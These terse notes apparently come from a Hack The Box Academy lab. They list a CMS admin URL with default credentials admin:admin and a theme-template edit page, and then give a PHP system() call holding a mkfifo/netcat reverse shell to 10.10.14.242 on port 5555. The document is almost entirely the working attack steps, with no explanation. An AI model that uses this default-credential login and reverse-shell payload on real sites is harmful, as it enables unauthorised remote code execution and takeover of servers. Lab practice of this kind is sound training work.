# Academy notes

* [http://gettingstarted.htb/admin/](http://gettingstarted.htb/admin/)    admin:admin
* [http://gettingstarted.htb/](http://gettingstarted.htb/admin/)theme     where start the theme to execute the code
* [http://gettingstarted.htb/admin/theme-edit.php?t=Innovation\&f=template.php](http://gettingstarted.htb/admin/theme-edit.php?t=Innovation\&f=template.php)   to edit the template

```
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.242 5555 >/tmp/f');
```
